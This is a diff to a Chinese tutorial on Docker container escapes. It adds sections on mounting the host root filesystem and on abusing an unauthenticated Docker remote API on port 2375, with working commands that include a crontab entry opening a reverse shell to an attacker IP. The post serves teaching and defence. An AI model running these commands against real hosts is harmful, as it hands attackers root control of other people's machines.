@@ -163,7 +163,7 @@ cat /proc/self/status | grep CapEff
 fdisk -l
 ```
 
-吔？好像跟别人说的不太一样
+吔？好像结果跟别人说的不太一样
 
 ```bash
 # fdisk -l
@@ -207,13 +207,14 @@ Number  Start (sector)    End (sector)  Size Name
 ```
 
 应该是虚拟机导致的。
-尝试了下上面那几个奇怪的玩意实际是不存在的，然后一直试到 `/dev/sda3` 就挂载上了
+
+尝试了下，上面那几个奇怪的玩意实际是不存在的，然后一直试到 `/dev/sda3` 就挂载上了
 
 ```bash
 mount /dev/sda3 /mnt
 ```
 
-宿主机的根目录就挂载上去了，`cd` 进去再 `chroot .` 即可。
+此时宿主机的根目录就挂载上去了，`cd` 进去再 `chroot .` 即可。
 当然写 crontab 挂一个反弹 shell 也可以。
 
 ### 挂载 Docker Socket
@@ -352,9 +353,9 @@ nc -lvnp <your_host_port>
 
 宿主机 root 的 shell 就弹出来了。
 
-现在说说原理：Linux 有一个核心转储（core dump）机制（这中文听着怪怪的哈），当进程崩溃时，内核会将进程的内存映像保存到一个文件，用于调试。
+现在说说原理：Linux 有一个核心转储（core dump）机制（这中文听着怪怪的哈），当**进程崩溃时**，内核会将进程的内存映像保存到一个文件，用于调试。
 
-而 `/proc/sys/kernel/core_pattern` 定义了核心转储文件的生成规则。其格式分为现和：
+而 `/proc/sys/kernel/core_pattern` 定义了核心转储文件的生成规则。其格式分为：
 
 1. 静态路径：如 `/var/crash/core.%p`（`%p` 表示进程 PID）。
 2. 管道命令：以 | 开头时，内核会将 core dump 内容通过管道传递给指定程序，格式为：
@@ -433,7 +434,80 @@ lrwxrwxrwx  1 root root   72  3月 20 15:05 JVXDIO6M3RVT6N6O2ETGZQ5IY4 -> ../78e
 
 ### 挂载宿主机根目录
 
+看过上文的读者应该对这个没什么疑问了，这个就是上面提到的攻击路径的最后一环，如特权模式、挂载 Docker Socket 等等，都是为了获取宿主机的根目录的访问权限，方法上就是挂载宿主机的根目录到容器里。
+
+环境搭建命令如下：
+
+```bash
+docker run -it -v /:/mnt/ ubuntu
+```
+
+`cd` 进去，`chroot .` 就可以了，crontab 也可以，上文多次提到，不再赘述。
+
 ### Docker remote api 未授权访问
+
+将 Dockerd 的监听设在 2375 端口：
+
+```bash
+sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
+INFO[2025-04-22T10:39:23.909818793+08:00] Starting up
+failed to start daemon, ensure docker is not running or delete /var/run/docker.pid: process with PID 1319 is still running
+```
+
+意思是要先关掉 Docker
+
+```bash
+sudo systemctl stop docker
+```
+
+再来
+
+```bash
+sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
+INFO[2025-04-22T10:40:38.151876920+08:00] Starting up
+WARN[2025-04-22T10:40:38.152530906+08:00] Binding to IP address without --tlsverify is insecure and gives root access on this machine to everyone who has access to your network.  host="tcp://0.0.0.0:2375"
+WARN[2025-04-22T10:40:38.152554700+08:00] Binding to an IP address, even on localhost, can also give access to scripts run in a browser. Be safe out there!  host="tcp://0.0.0.0:2375"
+WARN[2025-04-22T10:40:38.152609238+08:00] [DEPRECATION NOTICE] In future versions this will be a hard failure preventing the daemon from starting! Learn more at: https://docs.docker.com/go/api-security/  host="tcp://0.0.0.0:2375"
+WARN[2025-04-22T10:40:39.154871410+08:00] Binding to an IP address without --tlsverify is deprecated. Startup is intentionally being slowed down to show this message  host="tcp://0.0.0.0:2375"
+WARN[2025-04-22T10:40:39.154978953+08:00] Please consider generating tls certificates with client validation to prevent exposing unauthenticated root access to your network  host="tcp://0.0.0.0:2375"
+WARN[2025-04-22T10:40:39.155023761+08:00] You can override this by explicitly specifying '--tls=false' or '--tlsverify=false'  host="tcp://0.0.0.0:2375"
+WARN[2025-04-22T10:40:39.155038038+08:00] Support for listening on TCP without authentication or explicit intent to run without authentication will be removed in the next release  host="tcp://0.0.0.0:2375"
+INFO[2025-04-22T10:40:54.210520545+08:00] detected 127.0.0.53 nameserver, assuming systemd-resolved, so using resolv.conf: /run/systemd/resolve/resolv.conf
+INFO[2025-04-22T10:40:54.447847216+08:00] [graphdriver] using prior storage driver: overlay2
+INFO[2025-04-22T10:40:54.463550314+08:00] Loading containers: start.
+INFO[2025-04-22T10:40:54.986964216+08:00] Default bridge (docker0) is assigned with an IP address 172.17.0.0/16. Daemon option --bip can be used to set a preferred IP address
+INFO[2025-04-22T10:40:55.090980115+08:00] Loading containers: done.
+WARN[2025-04-22T10:40:55.145707727+08:00] [DEPRECATION NOTICE]: API is accessible on http://0.0.0.0:2375 without encryption.
+         Access to the remote API is equivalent to root access on the host. Refer
+         to the 'Docker daemon attack surface' section in the documentation for
+         more information: https://docs.docker.com/go/attack-surface/
+In future versions this will be a hard failure preventing the daemon from starting! Learn more at: https://docs.docker.com/go/api-security/
+INFO[2025-04-22T10:40:55.145782627+08:00] Docker daemon                                 commit="26.1.3-0ubuntu1~22.04.1" containerd-snapshotter=false storage-driver=overlay2 version=26.1.3
+INFO[2025-04-22T10:40:55.145947337+08:00] Daemon has completed initialization
+INFO[2025-04-22T10:40:55.236241515+08:00] API listen on /var/run/doc
+```
+
+可以看到输出中已经对安全性作了警告
+
+在局域网中 `wget` 一下这个 IP:2375，若返回 404，则说明可能存在漏洞
+
+```bash
+IP=<your_host_ip>
+curl http://$IP:2375/containers/json    # 列出容器信息
+docker -H tcp://$IP:2375 ps -a  # 查看容器
+```
+
+攻击手法也是类似的，创建一个容器并挂载宿主机的根目录
+
+```bash
+docker -H tcp://$IP:2375 run -it -v /:/mnt/ ubuntu
+```
+
+依然 `cd` `chroot` 一把梭，抑或反弹 shell：
+
+```bash
+echo '* * * * * /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1' >> /mnt/var/spool/cron/crontabs/root
+```
 
 ## 如何设计一个安全的容器方案
 
